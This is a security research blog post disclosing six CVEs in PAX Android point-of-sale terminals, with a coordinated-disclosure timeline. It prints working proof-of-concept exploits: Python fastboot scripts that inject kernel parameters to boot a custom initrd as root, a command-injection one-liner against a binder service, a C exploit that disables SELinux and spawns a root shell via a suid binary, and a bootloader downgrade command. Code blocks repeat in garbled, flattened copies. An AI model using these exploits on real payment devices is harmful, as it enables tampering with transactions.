> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.stmcyber.com](https://blog.stmcyber.com/pax-pos-cves-2023/)

> In this article, we present details of 6 vulnerabilities on the Android POS devices made by the world......

Banking companies worldwide are finally shifting away from custom-made Point of Sale (POS) devices towards the wildly adopted and battle-tested Android operating system. No more obscure terminals; the era of giant, colorful touchscreens is here! While Android is a secure, hardened OS, implementing and integrating your own features with custom hardware requires a lot of time and effort.

STM Cyber R&D team decided to reverse engineer POS devices made by the worldwide known company PAX Technology, as they are being rapidly deployed in Poland. In this article, we present technical details of 6 vulnerabilities, which were assigned CVEs.

[![](https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png)](https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png)Exploited PAX A920 device

Due to heavy application sandboxing in the Android operating system (the base for the PaxDroid system present on PAX devices), applications can't interfere with each other. Still, some applications require higher privileges to control certain parts of the device, thus they are running as higher-privileged user. However, if an attacker can escalate their privileges to the

root

`root`

account, they can tamper with any application, including certain parts of payment operations. While an attacker still can't access decrypted information about the payee (like credit card information), since they are being processed in separate Secure Processor (SP), they can modify data the merchant application sends to the SP, which includes transaction amount. Obtaining access to other high-privileged accounts, such as

system

`system`

, is also valuable since it makes the attack surface to the

root

`root`

account much bigger.

While searching for vulnerabilities, STM Cyber focused on 2 attack vectors:

*   Local code execution from the bootloader, which doesn't require any privileges other than access to the USB port of the device. While this requires physical access to the device, this is still an interesting attack vector due to the nature of POS devices. Since different PAX POS use different CPU vendors, they also use different bootloaders. We've found **CVE-2023-4818** when testing PAX A920, while A920Pro and A50 were vulnerable to **CVE-2023-42134** and **CVE-2023-42135**.
*   Privilege escalation to
    
    system
    
    `system` user. Vulnerabilities from this class are present in the PaxDroid system itself thus they are present in almost all Android-based PAX POS devices. **CVE-2023-42136** allows for privilege escalation from any user to
    
    system
    
    `system` account greatly increasing attack surface.

CVE-2023-42133 - Reserved
-------------------------

🙂

CVE-2023-42134 - Signed partition overwrite and subsequently local code execution as root via hidden bootloader command
-----------------------------------------------------------------------------------------------------------------------

*   Product: PAX A920Pro/PAX A50/PAX A77
*   CVSS Score: CVSS 7.6 (AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
*   Impact: Local code execution as
    
    root
    
    `root`
*   Known vulnerable version: PayDroid 8.1.0_Sagittarius_11.1.50_20230314
*   Fix verified in: PayDroid 8.1.0_Sagittarius_V02.9.99T9_20230919
*   CERT.PL reference: [https://cert.pl/en/posts/2024/01/CVE-2023-4818/](https://cert.pl/en/posts/2024/01/CVE-2023-4818/)

By executing the hidden

oem paxassert

`oem paxassert`

command in fastboot mode, it's possible to overwrite the unsigned

pax1

`pax1`

partition. This results in injection of kernel arguments, resulting in arbitrary code execution. Fastboot flashing handler function first checks if we're trying to flash a special partition:

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83.png)

If the provided partition name is

pax1

`pax1`

, and

paxAssert

`paxAssert`

, the configuration will be applied:

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/9a81019f-3776-479b-8a15-3d93ac7b03ec.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/9a81019f-3776-479b-8a15-3d93ac7b03ec.png)

pax1

`pax1`

is a special partition that doesn't contain filesystem but behaves more like a configuration map. Certain values from this map are used as kernel parameters (and allow spaces in their values), giving us kernel parameter injection.

Attached below is a PoC script, which chains kernel parameter injection with custom rootfs executed from a fastboot buffer (technique explained in depth [here](https://alephsecurity.com/2017/08/30/untethered-initroot/)).

from contextlib import contextmanager

from usb1 import USBContext, USBError, USBDeviceHandle

# these 4 values may need to be changed on per-product basis:

# we assume this will be used only after open_fastboot

g_handle: USBDeviceHandle = None # type: ignore

def send(bytez: bytes) -> None:

print(f"Sending {len(bytez)} {bytez[:0x18]}...")

g_handle.bulkWrite(ep_out, bytez)

def recv(count: int = 512) -> bytes:

data = g_handle.bulkRead(ep_in, count)

print("Got status", data)

def cmd(data: bytes) -> bytes:

def check_status(expected, received):

raise RuntimeError(f"Expected status {expected}, got, {received}")

def open_fastboot(*args, **kwargs):

with USBContext() as ctx:

device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID)

print("Device not found")

print("Failed to open USB device")

with g_handle.claimInterface(0):

def upload_image(path: Path) -> None:

total_size = path.stat().st_size

send(f"download:{total_size:08x}".encode())

check_status(b"DATA", response[:4])

with open(path, "rb") as file:

check_status(b"OKAY", response)

def flash(partition_name: str) -> None:

check_status(b"OKAY", cmd(f"flash:{partition_name}".encode()))

def upload_data(bytez: bytes) -> None:

# yes, I know this could be done better but I'm too lazy

with tempfile.NamedTemporaryFile() as tmp:

upload_image(Path(tmp.name))

if __name__ == "__main__":

print("invalid number of parameters, please provide image")

initrd_image = Path(sys.argv[1])

initrd_size = initrd_image.stat().st_size

print("enabling paxassert")

check_status(cmd(b"oem paxassert"), b"OKAY")

print("pushing pax1 partition")

upload_data(f'LOCALE="pl-PL initrd=0x82000000,{initrd_size}"'.encode())

upload_image(initrd_image)

check_status(b"OKAY", cmd(b"continue"))

from pathlib import Path import sys import tempfile from contextlib import contextmanager from usb1 import USBContext, USBError, USBDeviceHandle # these 4 values may need to be changed on per-product basis: PAX_VID = 0x2fb8 PAX_PID = 0x2240 ep_in = 0x85 ep_out = 0x06 # we assume this will be used only after open_fastboot g_handle: USBDeviceHandle = None # type: ignore def send(bytez: bytes) -> None: print(f"Sending {len(bytez)} {bytez[:0x18]}...") g_handle.bulkWrite(ep_out, bytez) def recv(count: int = 512) -> bytes: data = g_handle.bulkRead(ep_in, count) print("Got status", data) return data def cmd(data: bytes) -> bytes: send(data) return recv() def check_status(expected, received): if received != expected: raise RuntimeError(f"Expected status {expected}, got, {received}") @contextmanager def open_fastboot(*args, **kwargs): with USBContext() as ctx: device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID) if device is None: print("Device not found") exit(1) try: global g_handle g_handle = device.open() except USBError: print("Failed to open USB device") exit(1) with g_handle.claimInterface(0): yield def upload_image(path: Path) -> None: total_size = path.stat().st_size send(f"download:{total_size:08x}".encode()) response = recv() check_status(b"DATA", response[:4]) with open(path, "rb") as file: while True: data = file.read(512) if not data: break send(data) response = recv() check_status(b"OKAY", response) def flash(partition_name: str) -> None: check_status(b"OKAY", cmd(f"flash:{partition_name}".encode())) def upload_data(bytez: bytes) -> None: # yes, I know this could be done better but I'm too lazy with tempfile.NamedTemporaryFile() as tmp: tmp.write(bytez) tmp.flush() upload_image(Path(tmp.name)) if __name__ == "__main__": if len(sys.argv) != 2: print("invalid number of parameters, please provide image") sys.exit(1) initrd_image = Path(sys.argv[1]) initrd_size = initrd_image.stat().st_size with open_fastboot(): print("enabling paxassert") upload_data(b"yes\x00") check_status(cmd(b"oem paxassert"), b"OKAY") print("pushing pax1 partition") upload_data(f'LOCALE="pl-PL initrd=0x82000000,{initrd_size}"'.encode()) print("flashing pax1") flash("pax1") print("pushing initrd") upload_image(initrd_image) check_status(b"OKAY", cmd(b"continue"))

```
from pathlib import Path
import sys
import tempfile
from contextlib import contextmanager
from usb1 import USBContext, USBError, USBDeviceHandle

# these 4 values may need to be changed on per-product basis:
PAX_VID = 0x2fb8
PAX_PID = 0x2240
ep_in = 0x85
ep_out = 0x06

# we assume this will be used only after open_fastboot
g_handle: USBDeviceHandle = None  # type: ignore

def send(bytez: bytes) -> None:
    print(f"Sending {len(bytez)} {bytez[:0x18]}...")
    g_handle.bulkWrite(ep_out, bytez)

def recv(count: int = 512) -> bytes:
    data = g_handle.bulkRead(ep_in, count)
    print("Got status", data)
    return data

def cmd(data: bytes) -> bytes:
    send(data)
    return recv()

def check_status(expected, received):
    if received != expected:
        raise RuntimeError(f"Expected status {expected}, got, {received}")

@contextmanager
def open_fastboot(*args, **kwargs):
    with USBContext() as ctx:
        device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID)
        if device is None:
            print("Device not found")
            exit(1)
        try:
            global g_handle
            g_handle = device.open()
        except USBError:
            print("Failed to open USB device")
            exit(1)

        with g_handle.claimInterface(0):
            yield

def upload_image(path: Path) -> None:
    total_size = path.stat().st_size
    send(f"download:{total_size:08x}".encode())
    response = recv()
    check_status(b"DATA", response[:4])

    with open(path, "rb") as file:
        while True:
            data = file.read(512)
            if not data:
                break
            send(data)

    response = recv()
    check_status(b"OKAY", response)

def flash(partition_name: str) -> None:
    check_status(b"OKAY", cmd(f"flash:{partition_name}".encode()))

def upload_data(bytez: bytes) -> None:
    # yes, I know this could be done better but I'm too lazy
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(bytez)
        tmp.flush()
        upload_image(Path(tmp.name))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("invalid number of parameters, please provide image")
        sys.exit(1)

    initrd_image = Path(sys.argv[1])
    initrd_size = initrd_image.stat().st_size

    with open_fastboot():
        print("enabling paxassert")
        upload_data(b"yes\x00")
        check_status(cmd(b"oem paxassert"), b"OKAY")

        print("pushing pax1 partition")
        upload_data(f'LOCALE="pl-PL initrd=0x82000000,{initrd_size}"'.encode())

        print("flashing pax1")
        flash("pax1")

        print("pushing initrd")
        upload_image(initrd_image)

        check_status(b"OKAY", cmd(b"continue"))

```

CVE-2023-42135 - Local code execution as root via kernel parameter injection in fastboot
----------------------------------------------------------------------------------------

*   Product: PAX A920Pro/PAX A50/PAX A77
*   CVSS Score: CVSS 7.6 (AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
*   Impact: Local code execution as
    
    root
    
    `root`
*   Known vulnerable version: PayDroid 8.1.0_Sagittarius_11.1.50_20230614
*   Fix verified in: PayDroid 8.1.0_Sagittarius_V02.9.99T9_20230919
*   CERT.PL reference: [https://cert.pl/en/posts/2024/01/CVE-2023-4818/](https://cert.pl/en/posts/2024/01/CVE-2023-4818/)

Contents of an unsigned “partition” named 

exsn

`exsn`

are concatenated to the kernel argument list. By flashing this

exsn

`exsn`

partition, it’s possible to inject arbitrary kernel arguments, resulting in arbitrary code execution.

Fastboot flashing handler function, first checks if we’re trying to flash a special partition:

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83-1.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83-1.png)

The value of

exsn

`exsn`

is passed in to kernel. Since

exsn

`exsn`

can be changed to any value, including one with spaces, it possible to inject any kernel parameters.

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/33cbd702-0b7d-414f-aeac-a6e29979170c.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/33cbd702-0b7d-414f-aeac-a6e29979170c.png)

Attached below is PoC script, which chains kernel parameter injection with custom initroot executed from fastboot buffer (technique explained in depth [here](https://alephsecurity.com/2017/08/30/untethered-initroot/)).

from contextlib import contextmanager

from usb1 import USBContext, USBError, USBDeviceHandle

# these 4 values may need to be changed on per-product basis:

# we assume this will be used only after open_fastboot

g_handle: USBDeviceHandle = None # type: ignore

def send(bytez: bytes) -> None:

print(f"Sending {len(bytez)} {bytez[:0x18]}...")

g_handle.bulkWrite(ep_out, bytez)

def recv(count: int = 512) -> bytes:

data = g_handle.bulkRead(ep_in, count)

print("Got status", data)

def cmd(data: bytes) -> bytes:

def check_status(expected, received):

raise RuntimeError(f"Expected status {expected}, got, {received}")

def open_fastboot(*args, **kwargs):

with USBContext() as ctx:

device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID)

print("Device not found")

print("Failed to open USB device")

with g_handle.claimInterface(0):

def upload_image(path: Path) -> None:

total_size = path.stat().st_size

send(f"download:{total_size:08x}".encode())

check_status(b"DATA", response[:4])

with open(path, "rb") as file:

check_status(b"OKAY", response)

def flash(partition_name: str) -> None:

check_status(b"OKAY", cmd(f"flash:{partition_name}".encode()))

def upload_data(bytez: bytes) -> None:

# yes, I know this could be done better but I'm too lazy

with tempfile.NamedTemporaryFile() as tmp:

upload_image(Path(tmp.name))

if __name__ == "__main__":

print("invalid number of parameters, please provide image")

initrd_image = Path(sys.argv[1])

initrd_size = initrd_image.stat().st_size

initrd_size = initrd_image.stat().st_size

exsn_data = exsn + b"initrd=0x82000000," + str(int(initrd_size)).encode()

print("exsn_data:", exsn_data)

upload_image(initrd_image)

check_status(b"OKAY", cmd(b"continue"))

from pathlib import Path import sys import tempfile from contextlib import contextmanager from usb1 import USBContext, USBError, USBDeviceHandle # these 4 values may need to be changed on per-product basis: PAX_VID = 0x2fb8 PAX_PID = 0x2240 ep_in = 0x85 ep_out = 0x06 # we assume this will be used only after open_fastboot g_handle: USBDeviceHandle = None # type: ignore def send(bytez: bytes) -> None: print(f"Sending {len(bytez)} {bytez[:0x18]}...") g_handle.bulkWrite(ep_out, bytez) def recv(count: int = 512) -> bytes: data = g_handle.bulkRead(ep_in, count) print("Got status", data) return data def cmd(data: bytes) -> bytes: send(data) return recv() def check_status(expected, received): if received != expected: raise RuntimeError(f"Expected status {expected}, got, {received}") @contextmanager def open_fastboot(*args, **kwargs): with USBContext() as ctx: device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID) if device is None: print("Device not found") exit(1) try: global g_handle g_handle = device.open() except USBError: print("Failed to open USB device") exit(1) with g_handle.claimInterface(0): yield def upload_image(path: Path) -> None: total_size = path.stat().st_size send(f"download:{total_size:08x}".encode()) response = recv() check_status(b"DATA", response[:4]) with open(path, "rb") as file: while True: data = file.read(512) if not data: break send(data) response = recv() check_status(b"OKAY", response) def flash(partition_name: str) -> None: check_status(b"OKAY", cmd(f"flash:{partition_name}".encode())) def upload_data(bytez: bytes) -> None: # yes, I know this could be done better but I'm too lazy with tempfile.NamedTemporaryFile() as tmp: tmp.write(bytez) tmp.flush() upload_image(Path(tmp.name)) if __name__ == "__main__": if len(sys.argv) != 2: print("invalid number of parameters, please provide image") sys.exit(1) initrd_image = Path(sys.argv[1]) initrd_size = initrd_image.stat().st_size with open_fastboot(): exsn = get_exsn() initrd_size = initrd_image.stat().st_size exsn_data = exsn + b"initrd=0x82000000," + str(int(initrd_size)).encode() print("exsn_data:", exsn_data) print("pushing exsn") upload_data(exsn_data) print("flashing exsn") flash("exsn") print("pushing initrd") upload_image(initrd_image) check_status(b"OKAY", cmd(b"continue"))

```
from pathlib import Path
import sys
import tempfile
from contextlib import contextmanager
from usb1 import USBContext, USBError, USBDeviceHandle

# these 4 values may need to be changed on per-product basis:
PAX_VID = 0x2fb8
PAX_PID = 0x2240
ep_in = 0x85
ep_out = 0x06

# we assume this will be used only after open_fastboot
g_handle: USBDeviceHandle = None  # type: ignore

def send(bytez: bytes) -> None:
    print(f"Sending {len(bytez)} {bytez[:0x18]}...")
    g_handle.bulkWrite(ep_out, bytez)

def recv(count: int = 512) -> bytes:
    data = g_handle.bulkRead(ep_in, count)
    print("Got status", data)
    return data

def cmd(data: bytes) -> bytes:
    send(data)
    return recv()

def check_status(expected, received):
    if received != expected:
        raise RuntimeError(f"Expected status {expected}, got, {received}")

@contextmanager
def open_fastboot(*args, **kwargs):
    with USBContext() as ctx:
        device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID)
        if device is None:
            print("Device not found")
            exit(1)
        try:
            global g_handle
            g_handle = device.open()
        except USBError:
            print("Failed to open USB device")
            exit(1)

        with g_handle.claimInterface(0):
            yield

def upload_image(path: Path) -> None:
    total_size = path.stat().st_size
    send(f"download:{total_size:08x}".encode())
    response = recv()
    check_status(b"DATA", response[:4])

    with open(path, "rb") as file:
        while True:
            data = file.read(512)
            if not data:
                break
            send(data)

    response = recv()
    check_status(b"OKAY", response)

def flash(partition_name: str) -> None:
    check_status(b"OKAY", cmd(f"flash:{partition_name}".encode()))

def upload_data(bytez: bytes) -> None:
    # yes, I know this could be done better but I'm too lazy
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(bytez)
        tmp.flush()
        upload_image(Path(tmp.name))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("invalid number of parameters, please provide image")
        sys.exit(1)

    initrd_image = Path(sys.argv[1])
    initrd_size = initrd_image.stat().st_size

    with open_fastboot():
        exsn = get_exsn()
        initrd_size = initrd_image.stat().st_size
        exsn_data = exsn + b" initrd=0x82000000," + str(int(initrd_size)).encode()
        print("exsn_data:", exsn_data)

        print("pushing exsn")
        upload_data(exsn_data)

        print("flashing exsn")
        flash("exsn")

        print("pushing initrd")
        upload_image(initrd_image)

        check_status(b"OKAY", cmd(b"continue"))

```

CVE-2023-42136 - Privilege escalation from any user/application to system user via shell injection binder-exposed service
-------------------------------------------------------------------------------------------------------------------------

*   Product: All Android-based PAX POS devices
*   CVSS Score: CVSS 8.8 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
*   Impact: Privilege escalation from any user/application to
    
    system
    
    `system` user
*   Known vulnerable version: PayDroid 11.1.50_20230614
*   Fix verified in: PayDroid V02.9.99T9_20230919
*   CERT.PL reference: [https://cert.pl/en/posts/2024/01/CVE-2023-4818/](https://cert.pl/en/posts/2024/01/CVE-2023-4818/)

Android service named 

PaxSmartDeviceServcie

`PaxSmartDeviceServcie`

(typo intended) is vulnerable to shell injection, escalating any user to

system

`system`

account. While it checks if the command starts with

dumpsys

`dumpsys`

, this check can be trivially bypassed by passing in

dumpsys; command

`dumpsys; command`

as an argument.

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/4ec25ad4-97ee-44ae-a402-31f5032f7963.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/4ec25ad4-97ee-44ae-a402-31f5032f7963.png)

adb shell "service call PaxSmartDeviceServcie 16 s16'dumpsysx; id > /data/local/tmp/win'"

adb shell "service call PaxSmartDeviceServcie 16 s16'dumpsysx; id > /data/local/tmp/win'"

```
adb shell "service call PaxSmartDeviceServcie 16 s16 'dumpsysx; id > /data/local/tmp/win'"

```

CVE-2023-42137 - Privilege escalation from system/shell user to root via insecure operations in systool_server daemon
---------------------------------------------------------------------------------------------------------------------

*   Product: All Android-based PAX POS devices
*   CVSS Score: CVSS 8.8 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
*   Impact: Privilege escalation from
    
    system
    
    `system`/
    
    shell
    
    `shell` user to
    
    root
    
    `root` user
*   Known vulnerable version: PayDroid 11.1.50_20230614
*   Fixed verified in: PayDroid V02.9.99T9_20230919
*   CERT.PL reference: [https://cert.pl/en/posts/2024/01/CVE-2023-4818/](https://cert.pl/en/posts/2024/01/CVE-2023-4818/)

systool_server

`systool_server`

is a daemon exposed via binder running with root privileges. It exposes an API for execution of

miniunz

`miniunz`

command with user controller input and output directory. An attacker can inject an arbitrary amount of parameters, including additional command flags. Furthermore, given that the attacker has control over both the source directory and the destination directory (

``

/tmp

`/tmp` ``

), they can manipulate this situation by crafting malicious symbolic links within the

/tmp

`/tmp`

directory. This allows the attacker to overwrite arbitrary files, potentially leading to the escalation of privileges. By overwriting specific files within the

/data

`/data`

partition, the attacker may exploit this vulnerability to assume the privileges of a

system

`system`

user, thereby hijacking an application that runs with system-level privileges.

systool_server

`systool_server`

performs multiple checks to verify caller uid and binary to ensure only verified binaries are using this API. These checks can be bypassed using good old

LD_PRELOAD

`LD_PRELOAD`

. Finally, to pop a fully interactive shell, we use mount without

nosuid

`nosuid`

to create a suid binary. See the code below for PoC:

struct binder_state *g_binder_state;

bs = binder_open(128*1024);

fprintf(stderr, "failed to open binder driver\n");

bio_init(&a, &b, 0x200, 4);

bio_put_string16_x(&a, "android.os.IServiceManager");

bio_put_string16_x(&a, "systool_binder");

int status = binder_call(bs, &a, &c, 0, 2);

int status2 = bio_get_ref(&c);

binder_acquire(bs, status2);

void systoolExecShellCmdV2(char* src) {

bio_init(&msg, buf, 0x200, 4);

bio_put_string16_x(&msg, "SystoolBinder");

bio_put_uint32(&msg, 3); // cmd

bio_put_uint32(&msg, 1); // subcmd

bio_put_uint32(&msg, 1); // num arguments

bio_put_string16_x(&msg, src);

int status = binder_call(g_binder_state, &msg, &reply, target, 18);

int ret1 = bio_get_uint32(&reply);

int ret2 = bio_get_uint32(&reply);

binder_done(g_binder_state, &msg, &reply);

printf("ExecShellCmdV2: ret1=%d ret2=%d\n", ret1, ret2);

int printf(const char* __fmt, ...) {

fprintf(stderr, "[*] Hello from PID %d\n", pid);

readlink("/proc/self/exe", linkbuf, 0x100);

fprintf(stderr, "[*] /proc/self/exe is pointing at %s\n", linkbuf);

system("rm /tmp/monitor.bin");

fprintf(stderr, "[*] disabling fs selinux\n");

system("ln -s /sys/fs/selinux/enforce /tmp/monitor.bin");

system("echo -n'0'> /data/local/tmp/zero");

systoolExecShellCmdV2("/data/local/tmp/zero");

system("rm /data/local/tmp/zero");

system("rm /tmp/monitor.bin");

fprintf(stderr, "[*] setting up suid\n");

system("chmod +s /data/local/tmp/escalate");

fprintf(stderr, "[*] copying suid to /mnt\n");

system("ln -s /mnt/escalate /tmp/monitor.bin");

systoolExecShellCmdV2("/data/local/tmp/escalate");

system("rm /tmp/monitor.bin");

fprintf(stderr, "[*] spawning shell\n");

execve("/mnt/escalate", NULL, NULL);

#include <errno.h> #include <fcntl.h> #include <inttypes.h> #include <stdlib.h> #include <string.h> #include <stdio.h> #include <dlfcn.h> #include <unistd.h> #include "binder.h" struct binder_state *g_binder_state; uint32_t target; int binder_init() { struct binder_state* bs; bs = binder_open(128*1024); if (!bs) { fprintf(stderr, "failed to open binder driver\n"); return -1; } char b[0x200]; struct binder_io a; struct binder_io c; bio_init(&a, &b, 0x200, 4); bio_put_uint32(&a, 0); bio_put_string16_x(&a, "android.os.IServiceManager"); bio_put_string16_x(&a, "systool_binder"); int status = binder_call(bs, &a, &c, 0, 2); if (status == 0) { int status2 = bio_get_ref(&c); if (status2 != 0) { target = status2; binder_acquire(bs, status2); } binder_done(bs, &a, &c); } g_binder_state = bs; return 0; } void systoolExecShellCmdV2(char* src) { struct binder_io msg; struct binder_io reply; char buf[0x200]; bio_init(&msg, buf, 0x200, 4); bio_put_uint32(&msg, 0); bio_put_string16_x(&msg, "SystoolBinder"); bio_put_uint32(&msg, 3); // cmd bio_put_uint32(&msg, 1); // subcmd bio_put_uint32(&msg, 1); // num arguments bio_put_string16_x(&msg, src); int status = binder_call(g_binder_state, &msg, &reply, target, 18); if (status == 0) { int ret1 = bio_get_uint32(&reply); int ret2 = bio_get_uint32(&reply); binder_done(g_binder_state, &msg, &reply); printf("ExecShellCmdV2: ret1=%d ret2=%d\n", ret1, ret2); } } int executed = 0; int printf(const char* __fmt, ...) { if (executed) return 0; executed = 1; pid_t pid = getpid(); fprintf(stderr, "[*] Hello from PID %d\n", pid); char linkbuf[0x100]; readlink("/proc/self/exe", linkbuf, 0x100); fprintf(stderr, "[*] /proc/self/exe is pointing at %s\n", linkbuf); binder_init(); // prep system("rm /tmp/monitor.bin"); fprintf(stderr, "[*] disabling fs selinux\n"); system("ln -s /sys/fs/selinux/enforce /tmp/monitor.bin"); system("echo -n'0'> /data/local/tmp/zero"); systoolExecShellCmdV2("/data/local/tmp/zero"); // cleanup system("rm /data/local/tmp/zero"); system("rm /tmp/monitor.bin"); fprintf(stderr, "[*] setting up suid\n"); system("chmod +s /data/local/tmp/escalate"); fprintf(stderr, "[*] copying suid to /mnt\n"); system("ln -s /mnt/escalate /tmp/monitor.bin"); systoolExecShellCmdV2("/data/local/tmp/escalate"); // cleanup system("rm /tmp/monitor.bin"); fprintf(stderr, "[*] spawning shell\n"); execve("/mnt/escalate", NULL, NULL); return 0; }

```
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include "binder.h"

struct binder_state *g_binder_state;
uint32_t target;

int binder_init() {
    struct binder_state* bs;
    bs = binder_open(128*1024);
    if (!bs) {
        fprintf(stderr, "failed to open binder driver\n");
        return -1;
    }
    char b[0x200];
    struct binder_io a;
    struct binder_io c;
    bio_init(&a, &b, 0x200, 4);
    bio_put_uint32(&a, 0);
    bio_put_string16_x(&a, "android.os.IServiceManager");
    bio_put_string16_x(&a, "systool_binder");
    int status = binder_call(bs, &a, &c, 0, 2);
    if (status == 0) {
        int status2 = bio_get_ref(&c);
        if (status2 != 0) {
            target = status2;
            binder_acquire(bs, status2);
        }
        binder_done(bs, &a, &c);
    }
    g_binder_state = bs;
    return 0;
}

void systoolExecShellCmdV2(char* src) {
    struct binder_io msg;
    struct binder_io reply;
    char buf[0x200];
    bio_init(&msg, buf, 0x200, 4);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, "SystoolBinder");
    bio_put_uint32(&msg, 3); // cmd
    bio_put_uint32(&msg, 1); // subcmd
    bio_put_uint32(&msg, 1); // num arguments
    bio_put_string16_x(&msg, src);
    int status = binder_call(g_binder_state, &msg, &reply, target, 18);
    if (status == 0) {
        int ret1 = bio_get_uint32(&reply);
        int ret2 = bio_get_uint32(&reply);
        binder_done(g_binder_state, &msg, &reply);
        printf("ExecShellCmdV2: ret1=%d ret2=%d\n", ret1, ret2);
    }
}

int executed = 0;

int printf(const char* __fmt, ...) {
    if (executed)
        return 0;
    executed = 1;

    pid_t pid = getpid();
    fprintf(stderr, "[*] Hello from PID %d\n", pid);
    char linkbuf[0x100];
    readlink("/proc/self/exe", linkbuf, 0x100);
    fprintf(stderr, "[*] /proc/self/exe is pointing at %s\n", linkbuf);

    binder_init();

    // prep
    system("rm /tmp/monitor.bin");

    fprintf(stderr, "[*] disabling fs selinux\n");
    system("ln -s /sys/fs/selinux/enforce /tmp/monitor.bin");
    system("echo -n '0' > /data/local/tmp/zero");
    systoolExecShellCmdV2("/data/local/tmp/zero");

    // cleanup
    system("rm /data/local/tmp/zero");
    system("rm /tmp/monitor.bin");

    fprintf(stderr, "[*] setting up suid\n");
    system("chmod +s /data/local/tmp/escalate");

    fprintf(stderr, "[*] copying suid to /mnt\n");
    system("ln -s /mnt/escalate /tmp/monitor.bin");
    systoolExecShellCmdV2("/data/local/tmp/escalate");

    // cleanup
    system("rm /tmp/monitor.bin");

    fprintf(stderr, "[*] spawning shell\n");
    execve("/mnt/escalate", NULL, NULL);

    return 0;
}

```

CVE-2023-4818 - Bootloader downgrade via improper tokenization
--------------------------------------------------------------

*   Product: PAX A920
*   CVSS Score: CVSS 7.3 (AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
*   Impact: Bootloader can be downgraded to a vulnerable version, resulting in local code execution as
    
    root
    
    `root`
*   Known vulnerable version: PayDroid 7.1.2_Aquarius_11.1.50_20230614
*   Fix verified in: PayDroid 7.1.2_Aquarius_V02.9.99T9_20230919
*   CERT.PL reference: [https://cert.pl/en/posts/2024/01/CVE-2023-4818/](https://cert.pl/en/posts/2024/01/CVE-2023-4818/)

By switching to fastboot mode and flashing a partition named 

aboot:

`aboot:`

, it’s possible to downgrade the bootloader to a previously vulnerable, signed version (version check is skipped).

We skip the signature and version check since 

aboot:

`aboot:`

does not match any known partition name:

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/9540d621-dbd2-4bb5-8dde-84a882ca221e.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/9540d621-dbd2-4bb5-8dde-84a882ca221e.png)

Then, the provided name is tokenized with 

:

`:`

- ending up with just

aboot

`aboot`

. This way, we can bypass the version check and downgrade the bootloader.

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/88f46489-9673-46e7-a732-3c3be12b52e8.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/88f46489-9673-46e7-a732-3c3be12b52e8.png)

fastboot flash 'aboot:' aboot.img

fastboot flash 'aboot:' aboot.img

```
fastboot flash 'aboot:' aboot.img

```

Disclosure timeline
-------------------

*   07/04/2023 - first contact with vendor briefly describing vulnerabilities (no reply)
*   08/05/2023 - second attempt of contact with vendor (successful)
*   10/05/2023 - sent technical details explaining all vulnerabilities (with PoC)
*   01/08/2023 - contacted CERT.PL to assign CVEs (instant reply)
*   09/10/2023 - further contact with PAX to fix found vulnerabilities
*   30/11/2023 - STM Cyber verifies patches
*   15/01/2024 - Public release